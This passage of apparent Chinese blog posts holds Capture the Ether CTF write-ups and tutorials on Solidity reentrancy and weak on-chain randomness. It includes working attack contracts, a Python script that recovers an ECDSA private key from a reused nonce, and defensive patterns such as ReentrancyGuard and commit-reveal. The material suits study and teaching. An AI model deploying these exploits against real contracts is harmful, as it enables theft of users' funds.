fuzz=FuzzyIdentityChallenge(address of your challenge);        fuzz.authenticate();    &#125;    function name() external view returns(bytes32)&#123;        return bytes32(&quot;smarx&quot;);    &#125;&#125;\n\nPublic Keypragma solidity ^0.4.21;contract PublicKeyChallenge &#123;    address owner = 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;    bool public isComplete;    function authenticate(bytes publicKey) public &#123;        require(address(keccak256(publicKey)) == owner);        isComplete = true;    &#125;&#125;\n\n由地址得到公钥\n椭圆曲线密码学和以太坊中的椭圆曲线数字签名算法应用\n由 w3.eth.getTransaction(&quot;0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb&quot;) 可以得到\nAttributeDict(&#123;&#x27;blockHash&#x27;: HexBytes(&#x27;0x487183cd9eed0970dab843c9ebd577e6af3e1eb7c9809d240c8735eab7cb43de&#x27;), &#x27;blockNumber&#x27;: 3015083, &#x27;from&#x27;: &#x27;0x92b28647Ae1F3264661f72fb2eB9625A89D88A31&#x27;, &#x27;gas&#x27;: 90000, &#x27;gasPrice&#x27;: 1000000000, &#x27;hash&#x27;: HexBytes(&#x27;0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb&#x27;), &#x27;input&#x27;: &#x27;0x5468616e6b732c206d616e21&#x27;, &#x27;nonce&#x27;: 0, &#x27;r&#x27;: HexBytes(&#x27;0xa5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7&#x27;), &#x27;s&#x27;: HexBytes(&#x27;0x5710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962&#x27;), &#x27;to&#x27;: &#x27;0x6B477781b0e68031109f21887e6B5afEAaEB002b&#x27;, &#x27;transactionIndex&#x27;: 7, &#x27;type&#x27;: &#x27;0x0&#x27;, &#x27;v&#x27;: 41, &#x27;value&#x27;: 0&#125;)\n\n使用ethereumjs-tx库创建一个交易从而利用里面封装的getSenderAddress得到公钥\nconst EthereumTx = require(&#x27;ethereumjs-tx&#x27;).Transaction;const js = require(&#x27;_js-sha3@0.8.0@js-sha3&#x27;);var rawTx = &#123;    nonce: &#x27;0x00&#x27;,    gasPrice: &#x27;0x3b9aca00&#x27;,    gasLimit: &#x27;0x15f90&#x27;,    to: &#x27;0x6B477781b0e68031109f21887e6B5afEAaEB002b&#x27;,    value: &#x27;0x00&#x27;,    data: &#x27;0x5468616e6b732c206d616e21&#x27;,    v: &#x27;0x29&#x27;,    r: &#x27;0xa5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7&#x27;,    s: &#x27;0x5710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962&#x27;&#125;;var tx = new EthereumTx(rawTx, &#123; chain: &#x27;ropsten&#x27;, hardfork: &#x27;petersburg&#x27; &#125;);pubkey=tx.getSenderPublicKey();pubkeys=pubkey.toString(&#x27;hex&#x27;);var address = js.keccak256(pubkey).toString(&#x27;hex&#x27;).slice(24);console.log(pubkeys);console.log(address);\n\nAccount Takeoverpragma solidity ^0.4.21;contract AccountTakeoverChallenge &#123;    address owner = 0x6B477781b0e68031109f21887e6B5afEAaEB002b;    bool public isComplete;    function authenticate() public &#123;        require(msg.sender == owner);        isComplete = true;    &#125;&#125;\n\n给出了地址求私钥\n参考1\n参考2\n有两笔同 from 地址且同 to 地址的交易，且 r 值相同\nconst EthereumTx = require(&#x27;ethereumjs-tx&#x27;).Transaction;var rawTx1 =    &#123; nonce: 0,        gasPrice: &#x27;0x3b9aca00&#x27;,        gasLimit: &#x27;0x5208&#x27;,        to: &#x27;0x92b28647ae1f3264661f72fb2eb9625a89d88a31&#x27;,        value: &#x27;0x1111d67bb1bb0000&#x27;,        data: &#x27;0x&#x27;,        v: 41,        r: &#x27;0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166&#x27;,        s: &#x27;0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8&#x27;    &#125;var rawTx2 =    &#123; nonce: 1,        gasPrice: &#x27;0x3b9aca00&#x27;,        gasLimit: &#x27;0x5208&#x27;,        to: &#x27;0x92b28647ae1f3264661f72fb2eb9625a89d88a31&#x27;,        value: &#x27;0x1922e95bca330e00&#x27;,        data: &#x27;0x&#x27;,        v: 41,        r: &#x27;0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166&#x27;,        s: &#x27;0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de&#x27;    &#125;tx1 = new EthereumTx(rawTx1,&#123; chain: &#x27;ropsten&#x27;, hardfork: &#x27;petersburg&#x27; &#125;);tx2 = new EthereumTx(rawTx2,&#123; chain: &#x27;ropsten&#x27;, hardfork: &#x27;petersburg&#x27; &#125;);z1=tx1.hash(false).toString(&quot;hex&quot;);z2=tx2.hash(false).toString(&quot;hex&quot;);console.log(z1);console.log(z2);\n\ns1-s2 = k ^ -1（z1 + dA * r）-k ^ -1（z2+ dA * r）= k^-1(z1-z2)k = (z1-z2)/(s1-s2)所以私钥 d = (s*k-z)/r= (s*k-z) * inverse_mod(r, p) % pk = (z1-z2)/(s1-s2)= (z1 – z2)*inverse_mod(s1 – s2,p)%p\n\n其中取模反的运算来自于python-ecdsa\ndef inverse_mod( a, m ):    &quot;&quot;&quot;Inverse of a mod m.&quot;&quot;&quot;    if a &lt; 0 or m &lt;= a: a = a % m    c, d = a, m    uc, vc, ud, vd = 1, 0, 0, 1    while c != 0:        q, c, d = divmod( d, c ) + ( c, )        uc, vc, ud, vd = ud - q*uc, vd - q*vc, uc, vc    assert d == 1    if ud &gt; 0: return ud    else: return ud + mdef derivate_privkey(p, r, s1, s2, z1, z2):    z = z1 - z2    s = s1 - s2    r_inv = inverse_mod(r, p)    s_inv = inverse_mod(s, p)    k = (z * s_inv) % p    d = (r_inv * (s1 * k - z1)) % p    return d, kz1 = 0x4f6a8370a435a27724bbc163419042d71b6dcbeb61c060cc6816cda93f57860cs1 = 0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108der = 0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166z2 = 0x350f3ee8007d817fbd7349c477507f923c4682b3e69bd1df5fbb93b39beb1e04s2 = 0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8p  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141print (&quot;privatekey:%x\\n k:%x&quot; % derivate_privkey(p,r,s1,s2,z1,z2))\n\n\n\nMiscellaneousAssume ownershippragma solidity ^0.4.21;contract AssumeOwnershipChallenge &#123;    address owner;    bool public isComplete;    function AssumeOwmershipChallenge() public &#123;        owner = msg.sender;    &#125;    function authenticate() public &#123;        require(msg.sender == owner);        isComplete = true;    &#125;&#125;\n\n构造函数拼写错误\nToken bankfunction transfer(address to, uint256 value, bytes data) public returns (bool) &#123;    require(balanceOf[msg.sender] &gt;= value);    balanceOf[msg.sender] -= value;    balanceOf[to] += value;    emit Transfer(msg.sender, to, value);    if (isContract(to)) &#123;        ITokenReceiver(to).tokenFallback(msg.sender, value, data);    &#125;    return true;&#125;\n\n这里判断了to地址是否是个合约地址，如果是合约的话就用ITokenReceiver接口来调用to合约的tokenFallback函数，在银行合约里这个函数用更改目标的balance，合约存在重入漏洞。\nfunction withdraw(uint256 amount) public &#123;    require(balanceOf[msg.sender] &gt;= amount);    require(token.transfer(msg.sender, amount));    // balance decreased after recipient is notified    // re-entrancy issue    balanceOf[msg.sender] -= amount;&#125;\n\n调用该token.transfer函数后余额会更新，允许我们每次重复提取我们的存入资金。重入控制流程将是challenge.withdraw =&gt; token.transfer =&gt; msg.sender.tokenFallback() =&gt; ... 。\n在调用攻击合约前，先将player账户withdraw出来，再给攻击合约授权\ncontract attacker &#123;    TokenBankChallenge public challenge;    constructor(address challengeAddress) &#123;        challenge = TokenBankChallenge(challengeAddress);    &#125;    function deposit() payable &#123;        challenge.token().transferFrom(address(0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624),address(this),500000000000000000000000);        challenge.token().transfer(address(challenge),challenge.token().balanceOf(address(this)));    &#125;    function attack() payable &#123;        callWithdraw();        require(challenge.isComplete(), &quot;challenge not completed&quot;);    &#125;    function tokenFallback(address from, uint256 value, bytes data) external &#123;        callWithdraw();    &#125;    function callWithdraw() payable &#123;        uint256 myInitialBalance = 500000000000000000000000;        uint256 challengeTotalRemainingBalance =            challenge.token().balanceOf(address(challenge));        bool keepRecursing = challengeTotalRemainingBalance &gt; 0;        if (keepRecursing) &#123;            uint256 toWithdraw =                myInitialBalance &lt; challengeTotalRemainingBalance                    ? myInitialBalance                    : challengeTotalRemainingBalance;            challenge.withdraw(toWithdraw);        &#125;    &#125;&#125;\n\n"},{"title":"智能合约重入漏洞","url":"/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/","content":"智能合约重⼊漏洞原理分析外部恶意合约回调了受攻击合约上的一个函数，并在受攻击合约上的任意位置“重新进入”代码执行。因为原合约的程序员可能没有预料到合约代码可以被”重入“，因此合约会出现不可预知的行为。在 gas 足够的情况下，合约之间甚至可以相互循环调用，直至达到 gas 的上限，但是如果循环中有转账之类的操作，就会导致严重的后果。\nfunction withdraw(uint _amount) public &#123;\trequire(balances[msg.sender] &gt;= _amount)\tmsg.sender.call.value(_amount)();\tbalances[msg.sender] -= _amount;&#125;\n\n\n其中，fallback函数是关键\nfallback函数当我们调用某个智能合约时，如果指定的函数找不到，或者根本就没指定调用哪个函数（如向合约发送 ether）时，fallback 函数就会被调用。\n向合约发送 send、transfer、call 消息时候都会调用 fallback 函数，不同的是 send 和 transfer 有 2300 gas 的限制，也就是传递给 fallback 的只有 2300 gas，这个 gas 只能用于记录日志，因为其他操作都将超过 2300 gas。但 call 则会把剩余的所有 gas 都给 fallback 函数，这有可能导致循环调用。\n而fallback函数是可以被重写的\n如果构造一个 fallback 函数，函数里面也调用对方的 withdraw 函数的话，那将会产生一个循环调用转账功能，存在漏洞的合约会不断向攻击者合约转账，终止循环结束（以太坊 gas 有上限）\n漏洞demopragma solidity ^0.6.10;contract Victim &#123;\tmapping(address =&gt; uint) public balances;\taddress public owner;        //构造函数，设定合约所有者    constructor() public &#123;        owner = msg.sender;    &#125;\t\t//接收资金转入\tfunction deposit() public payable &#123;\t\tbalances[msg.sender] += msg.value;\t&#125;\t\t//提款\tfunction withdraw(uint _amount) public &#123;\t\trequire(balances[msg.sender] &gt;= _amount);\t\tmsg.sender.call&#123;value: _amount&#125;(&quot;&quot;);\t\tbalances[msg.sender] -= _amount;\t&#125;\t\t//查询余额\tfunction getBalance() public view returns(uint) &#123;\t\treturn address(this).balance;\t&#125;&#125;\n\n攻击合约contract Attack &#123;\tVictim public victim;\t\t//设定受害者合约地址\tconstructor(address _victimAddress) public &#123;\t\tvictim = Victim(_victimAddress);\t&#125;\t\t//重写fallback\tfallback() external payable &#123;\t\tif(address(victim).balance &gt;= 1 ether)&#123;\t\t\tvictim.withdraw(1 ether);\t\t&#125;\t&#125;\t\t//攻击，调用受害者的withdraw函数\tfunction attack() external payable &#123;\t\trequire(msg.value &gt;= 1 ether);\t\tvictim.deposit&#123;value: 1 ether&#125;();\t\tvictim.withdraw(1 ether);\t&#125;\t\t//查询余额\tfunction getBalance() public view returns(uint) &#123;\t\treturn address(this).balance;\t&#125;&#125;\n\n复现过程虚拟机中\n分别为受害者和攻击者创建一个合约\n\n\n\n用deposit函数为受害者设定一定余额\n\n\n\n检查受害者余额\n\n\n\n进行攻击\n\n\n\n检查攻击者和受害者的余额\n\n\n\n测试链上\n部署受害者合约\n\n\n\n部署攻击者合约\n\n\n为受害者合约打入2eth\n\n\n\n\n攻击\n\n\n\n结果\n\n\n\n\n重入次数由于gas的限制，重入次数是有一定限制的\n调整参数，实验出最高重入次数\n可以在区块链浏览器上查询到重入的次数\n\n大约是9次\n注意，一旦 out of gas 就会攻击失败。\n规避建议方法一总是用 send()或transfer() 来发送 ether，而不是用 call.value()。因为transfer和send函数的gas仅有2300，这点gas仅够捕获一个event，所以将无法进行可重入攻击。\n方法二确保在执行外部调用之前已经更新了所有的内部状态，这一模式被称为：Checks-Effects-Interactions（“检查-生效-交互”）\n第一步，大多数函数会先做一些检查工作（例如谁调用了函数，参数是否在取值范围之内，它们是否发送了足够的以太币Ether ，用户是否具有token等等）。这些检查工作应该首先被完成。\n第二步，如果所有检查都通过了，接下来进行更改合约状态变量的操作。\n第三步，与其它合约的交互应该是任何函数的最后一步。\nrequire(balances[msg.sender] &gt; amount); //检查require(this.balance &gt; amount); //检查balances[msg.sender] -= amount; // 生效to.call.value(amount)();  // 交互\n\n方法三\n使用互斥锁：添加一个在代码执行过程中锁定合约的状态变量，可防止重入调用\n\nbool reEntrancyMutex = false;function withdraw(uint _amount) public &#123;\trequire(!reEntrancyMutex);\treEntrancyMutex = true;\trequire(balances[msg.sender] &gt;= _amount);\tmsg.sender.call&#123;value: _amount&#125;(&quot;&quot;);\tbalances[msg.sender] -= _amount;\treEntrancyMutex = false;&#125;\n\n\n使用OpenZeppelin官方的ReentrancyGuard合约的nonReentrant modifier。\n\n与互斥锁的思想差不多，但是其官方将其封装成函数修饰词使用。\n在函数中增加nonReentrant modifier可保证其不可重入，任何对该函数的重入操作都将以revert the call的方式来拒绝。\n当合约中有多个函数时，由于modifier的粒度在单个函数，若想完全避免重入，应对每个函数都添加nonReentrant modifier。否则，仍然可以通过其他函数来重入然后发起重入攻击，若该函数可能破坏不变量。\n// SPDX-License-Identifier: MIT// OpenZeppelin Contracts v4.3.2 (security/ReentrancyGuard.sol)pragma solidity ^0.8.0;/** * @dev Contract module that helps prevent reentrant calls to a function. * * Inheriting from `ReentrancyGuard` will make the &#123;nonReentrant&#125; modifier * available, which can be applied to functions to make sure there are no nested * (reentrant) calls to them. * * Note that because there is a single `nonReentrant` guard, functions marked as * `nonReentrant` may not call one another. This can be worked around by making * those functions `private`, and then adding `external` `nonReentrant` entry * points to them. * * TIP: If you would like to learn more about reentrancy and alternative ways * to protect against it, check out our blog post * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul]. */abstract contract ReentrancyGuard &#123;    // Booleans are more expensive than uint256 or any type that takes up a full    // word because each write operation emits an extra SLOAD to first read the    // slot&#x27;s contents, replace the bits taken up by the boolean, and then write    // back. This is the compiler&#x27;s defense against contract upgrades and    // pointer aliasing, and it cannot be disabled.    // The values being non-zero value makes deployment a bit more expensive,    // but in exchange the refund on every call to nonReentrant will be lower in    // amount. Since refunds are capped to a percentage of the total    // transaction&#x27;s gas, it is best to keep them low in cases like this one, to    // increase the likelihood of the full refund coming into effect.    uint256 private constant _NOT_ENTERED = 1;    uint256 private constant _ENTERED = 2;    uint256 private _status;    constructor() &#123;        _status = _NOT_ENTERED;    &#125;    /**     * @dev Prevents a contract from calling itself, directly or indirectly.     * Calling a `nonReentrant` function from another `nonReentrant`     * function is not supported. It is possible to prevent this from happening     * by making the `nonReentrant` function external, and making it call a     * `private` function that does the actual work.     */    modifier nonReentrant() &#123;        // On the first call to nonReentrant, _notEntered will be true        require(_status != _ENTERED, &quot;ReentrancyGuard: reentrant call&quot;);        // Any calls to nonReentrant after this point will fail        _status = _ENTERED;        _;        // By storing the original value once again, a refund is triggered (see        // https://eips.ethereum.org/EIPS/eip-2200)        _status = _NOT_ENTERED;    &#125;&#125;\n\n\n使用采用pull payment模式，OpenZeppelin提供了PullPayment合约。\n\n其提供了_asyncTransfer函数，与transfer类似。然而，它不会将资金发送给接收者，而是将其转移到托管合约中。此外，PullPayment还为接收者提供了一个公共功能来提取（pull）他们的支付：withdrawPayments。\n// SPDX-License-Identifier: MIT// OpenZeppelin Contracts v4.3.2 (security/PullPayment.sol)pragma solidity ^0.8.0;import &quot;../utils/escrow/Escrow.sol&quot;;/** * @dev Simple implementation of a * https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls[pull-payment] * strategy, where the paying contract doesn&#x27;t interact directly with the * receiver account, which must withdraw its payments itself. * * Pull-payments are often considered the best practice when it comes to sending * Ether, security-wise. It prevents recipients from blocking execution, and * eliminates reentrancy concerns. * * TIP: If you would like to learn more about reentrancy and alternative ways * to protect against it, check out our blog post * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul]. * * To use, derive from the `PullPayment` contract, and use &#123;_asyncTransfer&#125; * instead of Solidity&#x27;s `transfer` function. Payees can query their due * payments with &#123;payments&#125;, and retrieve them with &#123;withdrawPayments&#125;. */abstract contract PullPayment &#123;    Escrow private immutable _escrow;    constructor() &#123;        _escrow = new Escrow();    &#125;    /**     * @dev Withdraw accumulated payments, forwarding all gas to the recipient.     *     * Note that _any_ account can call this function, not just the `payee`.     * This means that contracts unaware of the `PullPayment` protocol can still     * receive funds this way, by having a separate account call     * &#123;withdrawPayments&#125;.     *     * WARNING: Forwarding all gas opens the door to reentrancy vulnerabilities.     * Make sure you trust the recipient, or are either following the     * checks-effects-interactions pattern or using &#123;ReentrancyGuard&#125;.     *     * @param payee Whose payments will be withdrawn.     */    function withdrawPayments(address payable payee) public virtual &#123;        _escrow.withdraw(payee);    &#125;    /**     * @dev Returns the payments owed to an address.     * @param dest The creditor&#x27;s address.     */    function payments(address dest) public view returns (uint256) &#123;        return _escrow.depositsOf(dest);    &#125;    /**     * @dev Called by the payer to store the sent amount as credit to be pulled.     * Funds sent in this way are stored in an intermediate &#123;Escrow&#125; contract, so     * there is no danger of them being spent before withdrawal.     *     * @param dest The destination address of the funds.     * @param amount The amount to transfer.     */    function _asyncTransfer(address dest, uint256 amount) internal virtual &#123;        _escrow.deposit&#123;value: amount&#125;(dest);    &#125;&#125;\n\n在这里，合约资金被发送给中介托管:\nfunction sendPayment(address user, address escrow) external &#123;  require(msg.sender == authorized);    uint userBalance = userBalances[user];    require(userBalance &gt; 0);    userBalances[user] = 0;    (bool success,) = escrow.call&#123; value: userBalance &#125;(&quot;&quot;);  require(success,);&#125;\n\n在这里，托管资金可以由接收者提取:\nfunction pullPayment() external &#123;  require(msg.sender == receiver);    uint payment = account(this).balance;    (bool success,) = msg.sender.call&#123; value: payment &#125;(&quot;&quot;);  require(success,);&#125;\n","tags":["智能合约","漏洞"]},{"title":"智能合约错误随机性","url":"/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/","content":"错误随机性智能合约开发中，在程序中使用随机数较好的伪随机数是很难的。很多看似无法被预言的随机数种子或变量，实际被预言的难度很低。\n核心问题：一旦在智能合约中使用了随机性很差的随机数作为关键变量，就面临着随机数被预言的攻击风险。\nPRNG相关漏洞类型开发者生成随机数时，一般都会使用伪随机数生成器(pseudo-random number generator)，简称 PRNG。而有漏洞的PRNG，一般有三种类型：\n\n\n使用区块变量作为熵源的 PRNG\n\n基于过往区块(和私有种子)的区块哈希的 PRNG\n\n易被抢占交易(front-running)的 PRNG\n\n\n\n使用区块变量作为熵源\nblock.coinbase 表示当前区块的矿工地址\nblock.difficulty 表示当前区块的挖掘难度\nblock.gaslimit 区块内交易的最大限制燃气消耗量\nblock.number 表示当前区块高度\nblock.timestamp 表示当前区块挖掘时间\n\n以上所有的区块变量都可以被矿工操纵，所以都不能用来做信息熵源。因为这些区块变量在同一区块上是共用的。攻击者通过其恶意合约调用受害者合约，那么此交易打包在同一区块中，其区块变量是一样的。\n基于过往区块的区块哈希每一个Ethereum区块链上的区块都有认证的hash值，通过 block.blockhash() 函数可以获取此值。此函数经常被错误地使用。\n\nblock.blockhash(block.number) ：基于当前区块的区块哈希\nblock.blockhash(block.number - 1) ： 基于负一区块的区块哈希\nBlockhash of a future block : 使用未来区块的区块哈希\nBlockhash with a private seed : 使用一个私有种子(seed)变量\n\n基于当前区块的区块哈希通过 block.number 变量可以获取当前区块区块高度。但是还没执行时，这个“当前区块”是一个未来区块，即只有当一个矿工拾取一个执行合约代码的交易时，这个未来区块才变为当前区块，所以合约才可以可靠地获取此区块的区块哈希。而一些合约曲解了block.blockhash(block.number) 的含义，误认为当前区块的区块哈希在运行过程中是已知的，并将之做为熵源。还有一点就是在以太坊虚拟机中(EVM)，区块哈希恒为 0。\n基于负一区块的区块哈希uint256 random = uint256(keccak256(block.blockhash(block.number - 1)));\n\n这样的方式，虽然理论上可以获得随机数，但这个随机数是不安全的。因为攻击者可以使用改造后的FullNode，让这笔交易可以在FullNode上执行，并获得结果后，再选择性广播那些可以符合攻击者期望的交易，即可以操纵交易的执行结果。\n攻击合约只要以相同代码执行，即可以产生到同样的伪随机数。\n使用未来区块的区块哈希第一笔交易触发合约，合约存储某个未来区块高度。\n第二笔交易，合约检索当前区块高度，如果超过了存储的未来区块高度，则通过区块哈希获得伪随机数结果。\n然而，这种方式也有它的局限性：在TVM中，blockhash被限定为只能获取近256个高度区块的数据，因此在以上的两笔交易间隔超过256 * 3s，大约12.8分钟后，这种方式就会失效。\n此方法只有在十分必要的时候才能使用。因为也存在一定危险性，EVM 能存储的区块哈希为最近的 256 条。超过的话值为 0。\n易被抢占交易(front-running)原理：更高的 gas 价格，交易将更快被矿工拾取打包。\n为了获取最大的奖励，矿工通过每个交易的 gas 累积值来选择并创建新的区块。而这些交易的排序是基于它们的 gas 价格。最高的 gas 价格会先被执行。由此通过操纵 gas 价格，可以将交易的顺序排在当前区块的前面。这就会引发抢占交易问题。\n复现前提Ganache CLI使用ethereumjs来模拟完整的客户端行为，使开发以太坊应用程序更快，更轻松，更安全。它还包括所有主流的RPC函数和功能（如event），并可以准确地运行以使开发变得容易。\n在后文的复现中，由于在remix中使用VM会报错，所以会使用ganache-cli来进行模拟。\nganache-cli是用Javascript编写的，并通过npm作为Node包进行分发。安装之前首先要确保安装了Node.js（&gt; = v6.11.5），可以使用node -v来检查自己的Node.js的版本\n安装\nnpm install -g ganache-cli\n\n\n启动\nganache-cli\n\n\n漏洞demopragma solidity ^0.6.10;contract GuessTheRandomNumber &#123;    constructor() public payable &#123;            &#125;        //s    function guess(uint guess) public &#123;        uint answer = uint(keccak256(abi.encodePacked(            blockhash(block.number - 1),            block.timestamp            )));                    if (guess == answer) &#123;            (bool sent, ) = msg.sender.call&#123;value: 1 ether&#125;(&quot;&quot;);            require(sent, &quot;Failed to send Ether&quot;);        &#125;    &#125;&#125;\n\n攻击合约pragma solidity ^0.6.10;contract Attack &#123;    fallback() external payable &#123;            &#125;        function attack(GuessTheRandomNumber guessTheRandomNumber) public &#123;        uint answer = uint(keccak256(abi.encodePacked(            blockhash(block.number - 1),            block.timestamp            )));                    guessTheRandomNumber.guess(answer);    &#125;        function getBalance() public view returns (uint) &#123;        return address(this).balance;    &#125;&#125;\n\n复现过程\n在remix中运行的时候选择Web3 Provider，注意这里的Web3 Provider Endpoint应匹配使用ganache-cli中的端口\n\n\n\n分别为攻击者和受害者创建智能合约\n\n\n\n输入受害者合约地址进行攻击后，即可看到猜测成功，余额增加\n\n\n较安全伪随机数的产生方法hash-commit-revealhash-commit-reveal被很多合约开发者视为随机数的最佳实践方案，已经被广泛应用于大量的DAPP中，这里我们来看看它的工作原理。\nhash-commit-reveal的本质，是合约调用者和随机数提供者（通常情况下是某外部预言机）在波场区块链平台上通过一系列协议来生成随机数。\nDice2Win采用混合模式, 巧妙地解决随机数弱, 且容易被预测的问题. 其整个流程如下:　　　　1. 玩家指定行动计划, 并生产对应的hash值.　　2. 服务端收到玩家的hash值, 产生随机值reveal, 然后根据reveal生产commit值, 把这个返回给玩家　　3. 玩家带着commit和行动信息, 在智能合约下真正下注　　4. 服务端发起结算, 带着真正的reveal值去结算　　中间的行动计划和reveal没法中途修改, 因为有hash值的验证　　其本质的思想是hash-commit-reveal, 其核心的思想是: 服务端不知道玩家的行为, 玩家不知道服务端真正的随机数. 而最终结果在合约里验证hash, 并给出预期的结果. 这样的流程, 保证玩家和服务端都满意。\n此类随机数生成策略的缺点也是很明显的：高度依赖于预言机（secretSigner）对合约的回调。因此，预言机有选择性回调的作恶风险。\nOraclizeOraclize定位为去中心化应用的数据搬运工，它作为Web APIs和DApp的可靠链接，有了Oraclize，就不需要建立额外的信任链，因为我们的行为已经被强制加密验证。\nOraclize 提供了一个连接以太坊与外部环境(互联网)的桥梁。通过 Oraclize，智能合约能够通过 web API 请求数据。如当前的兑换率，天气预报或股票价格。其中一个最大的作用是能提供伪随机数。一些合约通过 Oraclize 中的 URL 连接器来连接 random.org 来获取伪随机数。\nOraclize是一个可证明的诚实的预言机服务，可以让智能合约访问互联网，Oraclize是平台无关的，为所有主流的智能合约平台提供一种虚拟的接口，通过Oraclize投入大量有意义的数据到区块链中，可以使得智能合约产业更加繁荣，让更多有价值的应用呈现更大的生命力，Oraclize的使用方式可以参考下面的代码：\nhttps://github.com/oraclize/ethereum-examples/blob/master/solidity/random-datasource/randomExample.sol\n/*   Oraclize random-datasource example   This contract uses the random-datasource to securely generate off-chain N random bytes*/pragma solidity ^0.4.11;import &quot;github.com/oraclize/ethereum-api/oraclizeAPI.sol&quot;;contract RandomExample is usingOraclize &#123;        event newRandomNumber_bytes(bytes);    event newRandomNumber_uint(uint);         function RandomExample() &#123;        oraclize_setProof(proofType_Ledger); // sets the Ledger authenticity proof in the constructor        update(); // let&#x27;s ask for N random bytes immediately when the contract is created!    &#125;        // the callback function is called by Oraclize when the result is ready    // the oraclize_randomDS_proofVerify modifier prevents an invalid proof to execute this function code:    // the proof validity is fully verified on-chain    function __callback(bytes32 _queryId, string _result, bytes _proof)    &#123;         // if we reach this point successfully, it means that the attached authenticity proof has passed!        if (msg.sender != oraclize_cbAddress()) throw;                if (oraclize_randomDS_proofVerify__returnCode(_queryId, _result, _proof) != 0) &#123;            // the proof verification has failed, do we need to take any action here? (depends on the use case)        &#125; else &#123;            // the proof verification has passed            // now that we know that the random number was safely generated, let&#x27;s use it..                        newRandomNumber_bytes(bytes(_result)); // this is the resulting random number (bytes)                        // for simplicity of use, let&#x27;s also convert the random bytes to uint if we need            uint maxRange = 2**(8* 7); // this is the highest uint we want to get. It should never be greater than 2^(8*N), where N is the number of random bytes we had asked the datasource to return            uint randomNumber = uint(sha3(_result)) % maxRange; // this is an efficient way to get the uint out in the [0, maxRange] range                        newRandomNumber_uint(randomNumber); // this is the resulting random number (uint)        &#125;    &#125;        function update() payable &#123;         uint N = 7; // number of random bytes we want the datasource to return        uint delay = 0; // number of seconds to wait before the execution takes place        uint callbackGas = 200000; // amount of gas we want Oraclize to set for the callback function        bytes32 queryId = oraclize_newRandomDSQuery(delay, N, callbackGas); // this function internally generates the correct oraclize_query and returns its queryId    &#125;&#125;\n\n考虑一个提供打赌的智能合约，用户调用打赌的接口，这个接口会把用户的请求存储起来，然后调用Oracle随机数生成服务，然后通过Oracle回调服务，判断随机数是否大于某个值，如果成立，那么用户成功，否则用户失败，这就是典型的Oracle的使用案例。\nRandaoRANDAO 机制就是，当用户通过储存（质押）32 ETH 成为验证者之后，该用户可以任意选定一个随机数。当需要为某个区块公布随机数时，将所有验证者的随机数加起来就可以得到一个全新的随机数。\nrandao是一个DAO(去中心化的匿名组织)允许任何人加入，随机数由所有参与者一起合作生成，首先我们需要在区块链上创建一个RANDAO的智能合约，合约定义了参与规则，然后生成随机数的基本过程可以分为下面三个步骤：\n第一步：收集有效的sha3(s)：参与随机数生成的参与者，首先需要在一个指定的时间区间(比如6个区块的区间，大约72秒)发送m ETH作为抵押到智能合约C，同时发送一个sha3(s)的值到智能合约C ，s是一个只有参与者自己知道的数字第二步:收集有效的s，在第一步结束后，那些提交了sha3(s)的参与者需要在指定的时间区间内发送s到智能合约C，智能合约C会检查sha3(s)和之前提交的值是否相同，相同的s会被保存到种子集合用来最终生成随机数。第三步:计算随机数并退回抵押和奖金，在所有的秘密数字s被成功收集后，智能合约C会使用函数f(s1,s2,…,sn)来计算随机数，随机数的结果会写入智能合约的存储，而且结果会被发送到所有之前请求随机数的其他智能合约上面，智能合约C会把第一阶段的抵押返回给参与者，然后奖金会被分成同等分发送给所有的参与者，奖金来源于请求随机值的其他智能合约。\nRNG补充规则：\n为了确保RNG不能被操控，以及为了安全和效率，智能合约C有以下的补充规则：\n在第一步中，如果有两个或更多个的同样的sha3(s)被提交上来，那么只有第一个会被接受在第一步中，对于参与者有最低要求，如果在指定时间区间内没有收集到足够多的sha3(s)的值，那么RNG在这个区块高度会失败如果参与者提交了sha3(s),那么他必须在第二步提交s如果参与者在第二步没有提交s，那么第一阶段提供的m ETH会被没收而且没有奖励如果一个或者多个s没有在第二步被提交，RNG在这个区块高度会失败，没收的ETH会被分成同等分发送给提交了s的其他参与者，其他申请随机数的其他合约的费用会被退回\nRNG激励机制：\nRNG的周期非常短，例如一个小时20个生成周期，如果没有周期的利润是0.001%,一个月的盈利会达到0.00001 * 20 * 24 * 30 = 0.144，为了达到14.4%每个月的盈利，并且RNG平均有n个参与者，运行智能合约C的费用为n * 3 * 500 * gasPrice + Ccost，CCost是合约内部的gas消费，包括计算和存储)假设每个随机值平均有r个请求，每个请求的费用是p ETH, 那么收入是r*p. 所以每个参与者每一次参与会收到rp - 1500n * gasPrice - Ccost)/n,当前的gasPrice是10 szabo, 合约的消费大概是1500n gas， 所以大概的净收入是(rp/n-0.03)ETH. 假设每个RNG有10个参与者，并且抵押是1000ETH，所以如果RNG如果只请求一次，那么一次的费用是0.4 ETH, 